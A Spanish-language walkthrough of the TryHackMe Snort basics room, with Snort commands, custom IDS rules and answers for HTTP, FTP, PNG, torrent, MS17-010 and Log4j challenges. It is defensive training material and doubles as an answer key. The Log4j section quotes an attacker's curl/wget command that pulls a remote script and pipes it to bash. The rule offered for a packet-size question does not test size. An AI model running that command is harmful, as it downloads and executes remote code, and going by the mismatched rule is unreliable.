Snort Challenge - The Basics
Preámbulo
El análisis de tráfico de red en tiempo real es una habilidad esencial en ciberseguridad. Snort, como sistema de detección de intrusos (IDS), permite monitorear, registrar y analizar paquetes de red utilizando reglas personalizadas.

Objetivos:

Aprender los fundamentos del funcionamiento básico de Snort.
Comprender el proceso de captura de tráfico de red.
Aprender y practicar el uso de reglas de Snort para analizar tráfico en tiempo real.
Escenario
El escenario presentado por TryHackMe consiste en una máquina basada en Linux y varios archivos que contienen comunicaciones de diferentes protocolos de red. Mediante la creación y aplicación de reglas, y utilizando Snort como sistema de detección y análisis, se inspeccionará y analizará ese tráfico en tiempo real para identificar eventos relevantes y entender el comportamiento de la red.

1º Reto Analizando Tráfico HTTP
Se presentan dos archivos: un archivo .pcap (datos capturados del tráfico de red) y un archivo de reglas locales (local.rules).

Tarea: Escribir una regla que detecte todo el tráfico TCP que se origine desde o se dirija hacia el puerto 80.

Comando Snort:

snort -c local.rules -A full -l . -r mx-3.pcap
Este comando ejecuta Snort utilizando las reglas definidas en local.rules, en modo de alerta detallada, guardando la salida en el directorio actual y analizando el archivo de captura mx-3.pcap.

Preguntas y Respuestas:

Pregunta 1: ¿Cuál es el número de paquetes detectados?
Respuesta: 164
Pregunta 2: ¿Cuál es la dirección de destino del paquete 63?
Respuesta: 216.239.59.99
Pregunta 3: ¿Cuál es el numero ACK del paquete 64?
Respuesta: 3921792965
Pregunta 4: ¿Cuál es el número SEQ del paquete 65?
Respuesta: 3614773047
Pregunta 5: ¿Cuál es el TTL del paquete 65?
Respuesta: 51
Pregunta 6: ¿Cuál es la dirección de origen del paquete 65?
Respuesta: 145.254.160.237
Pregunta 7: ¿Cuál es el puerto de origen del paquete 65?
Respuesta: 3372
Conclusión Primer reto:

Se ha puesto en práctica el análisis del tráfico HTTP, el uso de Snort y el análisis de archivo de logs para analizar dicho tráfico, permitiendo familiarizarse con el uso de esta herramienta.

2º Reto Analizando Tráfico FTP
Tráfico FTP que analizar, con un archivo .pcap y un archivo local.rules.

Preguntas y Respuestas:

Pregunta 1: Escribe una simple regla que detecta todo el tráfico TCP por el puerto 21.
Regla: alert tcp any any -> any 21 (msg:"FTP Traffic Detected on Port 21"; sid:1000001; rev:1;)
Pregunta 2: ¿Qué servicio de FTP se está utilizando?
Respuesta: ProFTPD 1.3.5
Pregunta 3: Escribe una regla que detecte los intentos fallidos de login dentro del FTP.
Regla: alert tcp any any -> any 21 (content:"530 Login incorrect"; msg:"Failed FTP Login Attempt"; sid:1000002; rev:1;)
Respuesta: 41
Pregunta 4: Escribe una regla para capturar los logins existosos.
Regla: alert tcp any any -> any 21 (content:"230 Login successful"; msg:"Successful FTP Login"; sid:1000003; rev:1;)
Respuesta: 1
Pregunta 5: Escribe una regla para detectar intentos de inicio de sesión FTP con un nombre de usuario válido pero sin que se haya ingresado la contraseña todavía.
Regla: alert tcp any any -> any 21 (content:"331 Please specify the password"; msg:"FTP Login - Password Required"; sid:1000004; rev:1;)
Respuesta: 42
Pregunta 6: Escribe una regla para detectar intentos de inicio de sesión FTP con el usuario Administrador pero sin que se haya ingresado la contraseña todavía.
Regla: alert tcp any any -> any 21 (content:"331 Please specify the password, administrator"; msg:"FTP Login - Password Required for Administrator"; sid:1000005; rev:1;)
Respuesta: 7
Conclusión Reto 2:

El análisis del tráfico FTP se puso en marcha empleando Snort; y, claro, los archivos de registros fueron estudiados a fondo, para identificar y entender las interacciones de este protocolo. Así se ha logrado familiarizarse con la detección de eventos FTP y el uso de reglas ad hoc para monitorear el tráfico de forma efectiva.

3º Reto Analizando PNG’s
Análisis de archivos PNG (Portable Network Graphics).

Preguntas y Respuestas:

Pregunta 1: ¿Cuál es el software incrustado utilizado?
Regla: alert tcp any any -> any any (content:".PNG"; msg:"PNG File Detected"; sid:1000006; rev:1;)
Respuesta: Adobe Image Ready
Pregunta 2: Escribe una nueva regla para investigar los logs en busca del forma embebido de la imagen dentro del paquete.
Regla: alert tcp any any -> any any (content:"GIF89a"; msg:"GIF Image Embedded in PNG"; sid:1000007; rev:1;)
Respuesta: GIF89a
Conclusión Reto 3:

El análisis permitió identificar con claridad la transferencia del archivo PNG dentro del tráfico capturado y verificar que las reglas configuradas detectan este tipo de contenido. Esto contribuye a comprender mejor el comportamiento del archivo en la red y a validar la eficacia del sistema de monitoreo.

4º Reto Analizando archivos Torrent
Trabajo con archivos torrents.

Preguntas y Respuestas:

Pregunta 1: Averiguar, mediante una regla, los paquetes detectados.
Regla: alert tcp any any -> any any (content:"BitTorrent protocol"; msg:"BitTorrent Traffic Detected"; sid:1000008; rev:1;)
Comando Snort: sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap
Respuesta: 2
Pregunta 2: ¿Cuál es la aplicación desde la cual se han descargado los torrents?
Respuesta: bittorrent
Pregunta 3: ¿Cuál es el nombre de host del metarchivo (metafile) del torrent?
Respuesta: tracker2.torrentboxx.com:2710
Conclusión Reto 4:

El análisis ha servido para responder de manera efectiva el reto relacionado con archivos y logs de Torrents.

Reto 5º Arreglando errores
Arreglo de distintos errores en reglas.

Preguntas y Respuestas:

Pregunta 1: Corregir error de sintaxis en la regla.
Error: Falta un espacio entre "any" y "(".
Respuesta: 16
Pregunta 2: Corregir error en la regla.
Error: La parte any -> es incorrecta, se requieren cuatro campos antes de la flecha.
Respuesta: 1
Pregunta 3: Corregir error en la regla.
Error: Los sid de las reglas deben ser contiguos.
Respuesta: 1
Pregunta 4: Corregir error en la regla.
Error: Se repite el problema del sid y hay un error de puntuación (":" en lugar de ";").
Respuesta: 1
Pregunta 5: Corregir error en la regla.
Error: Operador <> no válido y especificación incorrecta de múltiples puertos.
Respuesta: 1
Pregunta 6: Corregir error en la regla.
Error: Falta nocase y la regla estaba comentada.
Respuesta: 1
Pregunta 7: ¿Cuál es el nombre de la opción requerida?
Respuesta: msg
Conclusión Reto 5:

Este reto ha sido muy valioso para aprender a identificar errores, no solo en reglas ya existentes, sino también al momento de crear nuestras propias reglas.

6º Reto “Using External Rules (MS17-010)”
Uso de reglas externas, en este caso las de "MS17-010".

Preguntas y Respuestas:

Pregunta 1: ¿Cuántos paquetes se han detectado?
Respuesta: 25154
Pregunta 2: Detectar tráfico TCP que contenga la cadena \\IPC$.
Regla: alert tcp any any -> any any (content:"\\IPC$"; msg:"MS17-010 - IPC$ Share Access"; sid:1000016; rev:1;)
Respuesta: 1
Pregunta 3: ¿Cuál es el path necesario?
Respuesta: C:\Windows\system32\lsass.exe
Pregunta 4: ¿Cuál es la puntación que se le da la vulnerabilidad en cuanto gravedad el CVSS v2?
Respuesta: 9.3
Conclusión Reto 6:

En este reto hemos podido ver y aprender sobre una vulnerabilidad bastante importante.

Reto 7 Using External Rules (Log4j)
Este reto está relacionada con la vulnerabilidad Log4j.

Preguntas y Respuestas:

Pregunta 1: ¿Cuál es el número de paquetes detectados?
Respuesta: 26
Pregunta 2: ¿Cuántas reglas han sido activadas?
Respuesta: 1
Pregunta 3: Escribir los primeros seis dígitos del SID de la regla que se activó.
Respuesta: 202104
Pregunta 4: Detectar paquetes con un tamaño de entre 770 y 855 bytes.
Regla: alert tcp any any -> any any (content:"${jndi:"; msg:"Log4j Exploit Attempt"; flow:established,to_server; byte_jump: 2,58,relative,from_beginning; content: "ldap:"; within: 100; distance: 0; sid:20210400; rev:1;)
Respuesta: 41
Pregunta 5: ¿Cuál es algoritmo que se usó para codificar?
Respuesta: Base64
Pregunta 6: Id de un paquete.
Respuesta: 47
Pregunta 7: ¿Cuál fue el comando que atacante uso?
Respuesta: ( curl -s 45.155.205.233:5874/162.0.228.253:80 || wget -q -O - 45.155.205.233:5874/162.0.228.253:80) | bash
Pregunta 8: En esta pregunta se nos vuelve a pregunta sobre el puntaje CVSS v2
Respuesta: 9.3
Conclusión:

A lo largo del desarrollo de esta serie de desafíos, una visión completa y práctica sobre el uso de Snort como herramienta analítica y detectora de tráfico se ha forjado para nosotros en diferentes protocolos.


